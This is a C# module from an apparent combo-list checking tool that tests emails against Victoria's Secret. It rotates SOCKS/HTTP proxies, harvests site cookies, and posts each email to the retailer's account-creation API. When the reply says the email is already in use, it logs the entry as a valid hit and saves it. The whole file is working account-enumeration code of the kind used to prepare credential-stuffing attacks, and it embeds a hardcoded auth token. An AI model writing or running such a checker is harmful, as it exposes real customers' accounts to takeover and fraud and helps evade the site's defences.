using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class victoriassecret
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowAutoRedirect = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                string str1 = httpRequest.Get("https://www.victoriassecret.com/").ToString();
                string dtcook = httpRequest.Cookies.GetCookies("https://www.victoriassecret.com/")["dtCookie"].ToString();
                string cfbm = httpRequest.Cookies.GetCookies("https://www.victoriassecret.com/")["__cf_bm"].ToString();
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("cookie", "mcc=; uxoverride=; UID=31f592cb-61f8-479a-8f2c-20abbee146d1; tntId=324ff94c-88e2-47f3-965b-a744c6c414fb.34_0; " + dtcook + "; geolocatedCountry=UY; uxc=eyJBZG9iZSBBbmFseXRpY3MgQVBJIEVycm9yIE1lc3NhZ2UgUmF0ZSBMaW1pdGVyIjozLCJBZG9iZSBTd2l0Y2giOjc0LCJBZG9iZSBUYXJnZXQgUmVjcyBTd2l0Y2giOjYwLCJCYXphYXJ2b2ljZSBTd2l0Y2giOjM0LCJDZXJ0b25hIFN3aXRjaCI6ODgsIkYwMDEiOjc3LCJGMTAwIjo1OSwiRjEwMSI6MzIsIkYxMDMiOjgzLCJGMTA0Ijo0OCwiRjEwNSI6MjcsIkYxMDgiOjUyLCJGMTA5Ijo3MywiRjExMCI6OSwiRjExMiI6OTIsIkYxMTMiOjc1LCJGMTE2Ijo3NSwiRjExNyI6NTAsIkYyMDIiOjY5LCJGMjA1Ijo0MSwiRjIwNyI6MTksIkYyMDkiOjYzLCJGMjEwIjo3NSwiRjIxMSI6NzcsIkYyMTIiOjc2LCJGMjEzIjo2OCwiRjIxNCI6NDgsIkYyMTUiOjExLCJGMjE2Ijo5NywiRjIxNyI6ODcsIkYyMTgiOjgyLCJGMzAxIjo4NSwiRjMwMiI6MzMsIkYzMDMiOjQzLCJGMzA0Ijo1OCwiRjMwOSI6MTcsIkYzMTkiOjY1LCJGMzM2Ijo2MiwiRjMzOCI6NjEsIkYzNDAiOjQ1LCJGMzQxIjo1NywiRjM0NCI6MjQsIkYzNDUiOjgxLCJGMzQ3IjoxMywiRjM1MSI6NTAsIkYzNTIiOjQ3LCJGMzUzIjoxNCwiRjM1NCI6MzIsIkYzNTUiOjk1LCJGMzU2Ijo3NCwiRjM1NyI6OSwiRjQwNSI6MjEsIkY0MDciOjk2LCJGNDA5Ijo4LCJGNDEzIjoxMSwiRjQxNCI6OSwiRjQxNSI6OTIsIkY0MTYiOjgsIkY0MTciOjkwLCJGNTAwIjo3NSwiRjUwMSI6MzUsIkY1MDIiOjg3LCJGNTAzIjo4NSwiRjUwNCI6NjksIkY1MDUiOjc1LCJGNTA2Ijo3NiwiRjUwNyI6NzUsIkY1MDkiOjMyLCJGNjAwIjo3OSwiRjYwMSI6ODUsIkY2MDIiOjc4LCJGNjAzIjo4NSwiRjYwNCI6MywiRjYwNSI6NTAsIkY2MDYiOjMzLCJGNjA3IjoxNSwiRjYwOCI6MTgsIkY2MDkiOjI1LCJGNjE1IjozNywiRjcwMSI6MjQsIkY3MDMiOjU0LCJGNzA0Ijo3MiwiRjcwNSI6NDgsIkY3MDYiOjM2LCJGNzA3IjoyMSwiRjcxMCI6NjQsIkY4MDAiOjEwLCJGODAyIjo2MywiRjgwMyI6NCwiRjgwNCI6NzIsIkY4MDUiOjI2LCJGODA4Ijo2OCwiRjgxMSI6MTEsIkY4MTgiOjU2LCJGOTAwIjozMSwiRjkwMyI6NTIsIkY5MDYiOjY3LCJGOTA3IjoxNSwiRjkwOCI6NjEsIkY5MDkiOjUxLCJGOTEwIjo0NiwiRjkxMSI6OTYsIkY5MTIiOjQxLCJGQTAxIjo2LCJGQTAyIjo1NiwiRkEwNSI6ODUsIkZBMDYiOjQ0LCJGQTA3IjoxOSwiRkEwOCI6OTksIkZBMDkiOjEsIkZBMTAiOjgxLCJNb2JpbGUgQXBwIEN1c3RvbWVyIEluaXRpYXRlZCBDcmVkaXQgLSBBbmRyb2lkIjoxNywiTW9iaWxlIEFwcCBDdXN0b21lciBJbml0aWF0ZWQgQ3JlZGl0IC0gaU9TIjo3NSwiTW9iaWxlIEFwcCBPTFBTIC0gQW5kcm9pZCI6NzYsIk1vYmlsZSBBcHAgT0xQUyAtIGlPUyI6NiwiVDAzIjozOSwiVDE0Ijo3MSwiVDE2IjoyNCwiVDI2IjoxMDAsIlQyOSI6NCwiVDM1IjozMiwiVDM2IjoxMSwiVDcwIjo3OSwiVDcxIjo4NiwiVDcyIjozMiwiVDczIjo3NCwiVDc2IjoyMSwiVlNNQSBBbm9ueW1vdXMgVXNlciBMYW5kaW5nIFBhZ2UgLSBBbmRyb2lkIjo1MCwiVlNNQSBBbm9ueW1vdXMgVXNlciBMYW5kaW5nIFBhZ2UgLSBpT1MiOjk1fQ==; bc=0; auth_token=eyJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEiLCJ0eXAiOiJKV1QifQ.eyJhaWQiOiJmYTM5ZDBkZC02M2UyLTQ1MGUtODExMS0yNWZiNzFjMzFkMmUiLCJlbWFpbCI6IiIsImV4cCI6MTYzNTk5MzkwNCwiZmlyc3ROYW1lIjoiIiwiaWF0IjoxNjM1OTkxNzU0LCJpc3MiOiJNQVNUIC0gTCBCUkFORFMiLCJzaWQiOiIiLCJ1cyI6IkFub255bW91cyJ9.Ym3RHuovrgbr1q0GPfq0zUH9ftfwvl5mY-nTW3CZ0gI; __cf_bm=" + cfbm);
                httpRequest.AddHeader("origin", "https://www.victoriassecret.com");
                httpRequest.AddHeader("referer", "https://www.victoriassecret.com/");
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36");
                string str2 = httpRequest.Post("https://api.victoriassecret.com/auth/v18/create-account-vs", "{\"email\":\"" + strArray1[0] + "\",\"password\":\"23147052f-s_asdAS\",\"firstName\":\"roberto\",\"countryCode\":\"US\",\"channel\":\"VSWEB\",\"forceSaveAddress\":false,\"optInsVs\":{\"emailOptIn\":\"optIn\",\"mailOptIn\":\"notCollected\",\"smsOptIn\":\"notCollected\"}}", "text/plain").ToString();
                if (str2.Contains("Email address you entered is already in use. If you already have an account, sign in now."))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "VictoriasSecret VM");
                    return true;
                }
                else if (!str2.Contains("Email address you entered is already in use. If you already have an account, sign in now."))
                {
                    Interlocked.Increment(ref Program.Fail);
                    Interlocked.Increment(ref Program.Check);
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else
                {
                    ++Program.Error;
                    return false;
                }

            }
            catch
            {
                ++Program.Error;
                return false;
            }
        }
    }
}
